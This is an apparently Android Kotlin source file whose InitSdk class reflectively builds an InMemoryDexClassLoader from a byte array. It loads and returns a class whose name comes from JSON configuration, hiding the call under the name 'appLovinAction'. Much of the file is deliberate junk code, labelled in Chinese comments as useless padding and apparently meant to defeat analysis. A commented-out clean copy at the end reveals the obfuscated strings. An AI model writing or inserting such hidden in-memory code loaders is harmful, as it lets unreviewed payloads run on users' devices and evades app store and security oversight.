package com.whisper.gentle.core

import android.content.Context
import com.whisper.gentle.zip.BaseInit
import org.json.JSONObject
import java.nio.ByteBuffer

/**
 * Date：2025/11/18
 * Describe:
 */

class InitSdk : BaseInit() {
    private lateinit var json: JSONObject
    private val clazz2 by lazy {
        getClass(json.optString("str2"))
    }

    // 无用的垃圾变量
    private var uselessCounter: Int = 0
    private val garbageList = mutableListOf<Any?>()
    private val meaninglessMap = hashMapOf<String, String>()
    private var temporaryBuffer: ByteArray? = null
    private val randomGenerator = java.util.Random()
    private var debugFlag: Boolean = false
    private val emptyRunnable = Runnable { }
    private var cyclicReference: InitSdk? = null

    // 无用的初始化块
    init {
        uselessCounter = (Math.random() * 100).toInt()
        meaninglessMap["key1"] = "value" + System.currentTimeMillis()
        meaninglessMap["key2"] = "garbage" + uselessCounter
        cyclicReference = this
        temporaryBuffer = ByteArray(1024)
        temporaryBuffer?.fill(0x1F)
    }


    fun initJson(str: String) {
        json = JSONObject(str)

        // 无用的垃圾代码
        val tempStr = str + "_processed"
        val lengthCheck = tempStr.length > 0
        if (lengthCheck) {
            uselessCounter++
        }

        // 无意义的循环
        for (i in 0..5) {
            garbageList.add("item_$i")
        }

        // 无用的条件判断
        when (randomGenerator.nextInt(10)) {
            1 -> debugFlag = true
            else -> debugFlag = false
        }
    }

    fun appLovinAction(code: ByteArray, context: Context): Class<*>? {
        // 无用的前置处理
        val startTime = System.nanoTime()
        val codeHash = code.contentHashCode()
        uselessCounter += codeHash and 0xFF

        // 无用的中间变量
        val intermediateResult = code.size * 2
        val fakeCalculation = intermediateResult + uselessCounter

        val byteBuffer = ByteBuffer.wrap(code)

        // 无用的字符串操作
        val className = json.optString("str1")
        val processedClassName = className.trim() + "_checked"
        if (processedClassName.length > className.length) {
            meaninglessMap["class"] = processedClassName
        }

        val clazz = getClass(className) ?: return null.also {
            // 无用的失败处理
            garbageList.clear()
            temporaryBuffer = null
        }

        val constructor = clazz.getDeclaredConstructor(ByteBuffer::class.java, clazz2)

        // 无用的反射调用
        val methodName = json.optString("str3")
        val redundantCheck = context.javaClass.methods.size
        if (redundantCheck > 0) {
            uselessCounter = (uselessCounter * 1.5).toInt()
        }

        val clazzLoader = context.javaClass.getMethod(methodName).invoke(context)

        // 无用的对象创建前检查
        val canCreate = constructor.isAccessible || true
        if (!canCreate) {
            constructor.isAccessible = true
        }

        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)

        // 无用的后处理
        val endTime = System.nanoTime()
        val executionTime = endTime - startTime
        if (executionTime > 1000) {
            garbageList.add("slow_execution_$executionTime")
        }

        // 无用的资源清理（实际上不清理任何东西）
        temporaryBuffer?.fill(0)

        return fet(classLoader, Pair(json.optString("str5"), json.optString("str4")))
    }

    // 无用的垃圾方法
    private fun uselessMethod1(): Int {
        var result = 0
        for (i in 0..10) {
            result += i * uselessCounter
        }
        return result
    }

    private fun uselessMethod2(input: String): String {
        val builder = StringBuilder()
        input.forEach { char ->
            builder.append(char)
            builder.append(uselessCounter)
        }
        return builder.toString()
    }

    private fun recursiveUselessMethod(depth: Int): Boolean {
        return if (depth <= 0) {
            true
        } else {
            recursiveUselessMethod(depth - 1)
        }
    }

    // 无用的getter/setter
    fun getUselessCounter(): Int = uselessCounter
    fun setUselessCounter(value: Int) {
        uselessCounter = value
        garbageList.add("counter_changed_$value")
    }

    // 无用的接口实现
    private val uselessCallback = object : android.os.Handler.Callback {
        override fun handleMessage(msg: android.os.Message): Boolean {
            return false
        }
    }
}

//class InitSdk : BaseInit() {
//    private lateinit var json: JSONObject
//    private val clazz2 by lazy {
//        getClass(json.optString("str2"))
//    }
////    {
////        "str1": "dalvik.system.InMemoryDexClassLoader",
////        "str2": "java.lang.ClassLoader",
////        "str3": "getClassLoader",
////        "str4": "com.fb.network.FbInitHelper",
////        "str5": "loadClass"
////    }
//
//    fun initJson(str: String) {
//        json = JSONObject(str)
//    }
//
//    fun appLovinAction(code: ByteArray, context: Context): Class<*>? {
//
//        val byteBuffer = ByteBuffer.wrap(code)
//        //"dalvik.system.InMemoryDexClassLoader"
//        val clazz = getClass(json.optString("str1")) ?: return null
//
//        val constructor = clazz.getDeclaredConstructor(ByteBuffer::class.java, clazz2)
//
//        val clazzLoader = context.javaClass.getMethod(json.optString("str3")).invoke(context)
//
//        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)
//
//        return fet(classLoader, Pair(json.optString("str5"), json.optString("str4")))
//    }
//}
